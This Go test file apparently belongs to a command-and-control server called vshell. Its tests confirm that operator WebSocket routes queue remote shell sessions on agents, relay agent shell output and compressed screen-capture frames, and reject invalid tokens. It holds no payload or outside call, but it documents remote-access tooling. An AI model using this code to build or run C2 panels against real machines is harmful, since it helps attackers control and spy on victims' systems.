package router

import (
	"encoding/base64"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"testing"
	"time"

	"vshell/c2engine"
	"vshell/utils"

	"github.com/gorilla/websocket"
)

// dialTestStream starts an httptest server with the real router and dials one
// panel WebSocket as an authenticated viewer. It returns the live connection.
func dialTestStream(t *testing.T, path string) (*websocket.Conn, *httptest.Server) {
	t.Helper()
	srv := httptest.NewServer(InitRouter())

	tok, err := utils.GenerateToken("admin")
	if err != nil {
		t.Fatalf("generate token: %v", err)
	}
	url := "ws" + strings.TrimPrefix(srv.URL, "http") + path +
		"&token=" + tok

	dialer := websocket.Dialer{HandshakeTimeout: 5 * time.Second}
	conn, resp, err := dialer.Dial(url, http.Header{})
	if err != nil {
		status := 0
		if resp != nil {
			status = resp.StatusCode
		}
		srv.Close()
		t.Fatalf("dial %s: %v (status %d)", path, err, status)
	}
	return conn, srv
}

// initTestEngine brings the engine singleton up on a temporary SQLite file so
// NewClient's persistence path has a live storage handle. Without Init the
// engine has a nil *Storage, which panics on the first check-in.
func initTestEngine(t *testing.T) {
	t.Helper()
	if err := c2engine.GetEngine().Init(&c2engine.Config{DBPath: t.TempDir() + "/test.db"}); err != nil {
		t.Fatalf("engine init: %v", err)
	}
	t.Cleanup(func() {
		if err := c2engine.GetEngine().Close(); err != nil {
			t.Logf("engine close: %v", err)
		}
	})
}

// A panel terminal viewer must get a real WebSocket upgrade (not the old JSON
// "status":"ws" stub) and must cause the agent-side shell to be started.
func TestTerminalWSUpgradesAndStartsAgentShell(t *testing.T) {
	initTestEngine(t)
	client, err := c2engine.GetEngine().NewClient("term-vkey", "http", "127.0.0.1:1",
		"127.0.0.1", "u", "h", "linux", "agent", "amd64")
	if err != nil {
		t.Fatalf("new client: %v", err)
	}
	client.Status = true

	conn, srv := dialTestStream(t, "/api/terminal/ws?id="+itoa64(client.ID))
	defer func() {
		conn.Close()
		srv.Close()
	}()

	// The handler queues terminal_start for this client's agent.
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		for _, task := range c2engine.GetEngine().GetPendingTasks(client.ID) {
			if strings.HasPrefix(task.Command, "terminal_start") {
				return
			}
		}
		time.Sleep(20 * time.Millisecond)
	}
	t.Fatalf("no terminal_start task queued for client %d", client.ID)
}

// waitForViewer blocks until the handler has registered its viewer. The dial
// returns as soon as the handshake completes, which happens inside Upgrade;
// registration follows in the same goroutine, so a publisher that does not wait
// can race ahead of it.
func waitForViewer(t *testing.T, kind string, clientID int64) {
	t.Helper()
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		if c2engine.ViewerCount(kind, clientID) > 0 {
			return
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatalf("no %s viewer registered for client %d", kind, clientID)
}

// Agent terminal output must reach the connected viewer as raw shell bytes.
func TestTerminalWSDeliversAgentOutput(t *testing.T) {
	initTestEngine(t)
	client, err := c2engine.GetEngine().NewClient("term-vkey-2", "http", "127.0.0.1:1",
		"127.0.0.1", "u", "h", "linux", "agent", "amd64")
	if err != nil {
		t.Fatalf("new client: %v", err)
	}
	client.Status = true

	conn, srv := dialTestStream(t, "/api/terminal/ws?id="+itoa64(client.ID))
	defer func() {
		conn.Close()
		srv.Close()
	}()
	waitForViewer(t, c2engine.StreamTerminal, client.ID)

	// Both directions: the publisher needs the viewer registered first.
	want := "$ whoami\nroot\n"
	payload := "terminal_output:" + base64.StdEncoding.EncodeToString([]byte(want))
	if !c2engine.HandleStreamingResult(client.ID, payload) {
		t.Fatal("terminal_output not recognised as a streaming result")
	}

	_ = conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	_, data, err := conn.ReadMessage()
	if err != nil {
		t.Fatalf("read relayed terminal output: %v", err)
	}
	if string(data) != want {
		t.Fatalf("relayed output = %q, want %q", data, want)
	}
}

// Screen frames reach the viewer compressed (the SPA inflates them before use).
func TestScreenWSDeliversCompressedFrames(t *testing.T) {
	initTestEngine(t)
	client, err := c2engine.GetEngine().NewClient("screen-vkey", "http", "127.0.0.1:1",
		"127.0.0.1", "u", "h", "windows", "agent", "amd64")
	if err != nil {
		t.Fatalf("new client: %v", err)
	}
	client.Status = true

	conn, srv := dialTestStream(t, "/api/screen/ws?id="+itoa64(client.ID)+"&quality=normal")
	defer func() {
		conn.Close()
		srv.Close()
	}()
	waitForViewer(t, c2engine.StreamScreen, client.ID)

	img := []byte{0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46}
	if !c2engine.HandleStreamingResult(client.ID,
		"screen_frame:png:1:"+base64.StdEncoding.EncodeToString(img)) {
		t.Fatal("screen_frame not recognised as a streaming result")
	}

	_ = conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	msgType, data, err := conn.ReadMessage()
	if err != nil {
		t.Fatalf("read relayed screen frame: %v", err)
	}
	if msgType != websocket.BinaryMessage {
		t.Fatalf("screen frame message type = %d, want binary (%d)",
			msgType, websocket.BinaryMessage)
	}
	if len(data) == 0 || (data[0]&0x0F) != 8 {
		t.Fatalf("frame is not zlib-wrapped: % x", data[:min(4, len(data))])
	}
}

// An upgrade request with an invalid token must be rejected before the hijack.
//
// With a valid token beego cannot serve these routes at all — the embedded SPA
// bundle is a frontend asset, not a template, so beego fails the request with
// "Unknown view path" after the handler returns. That is why InitRouter registers
// the two panel WebSocket paths as plain net/http handlers (see registerStreamWSRoutes)
// rather than through beego.Router.
func TestStreamWSRejectsBadToken(t *testing.T) {
	srv := httptest.NewServer(InitRouter())
	defer srv.Close()

	for _, tok := range []string{"", "not-a-token"} {
		url := "ws" + strings.TrimPrefix(srv.URL, "http") + "/api/terminal/ws?id=1"
		if tok != "" {
			url += "&token=" + tok
		}
		_, resp, err := websocket.DefaultDialer.Dial(url, http.Header{})
		if err == nil {
			t.Fatalf("dial with token %q succeeded, want rejection", tok)
		}
		if resp == nil || resp.StatusCode != http.StatusUnauthorized {
			got := 0
			if resp != nil {
				got = resp.StatusCode
			}
			t.Fatalf("token %q: status = %d, want 401", tok, got)
		}
	}
}

func itoa64(n int64) string {
	return strconv.FormatInt(n, 10)
}
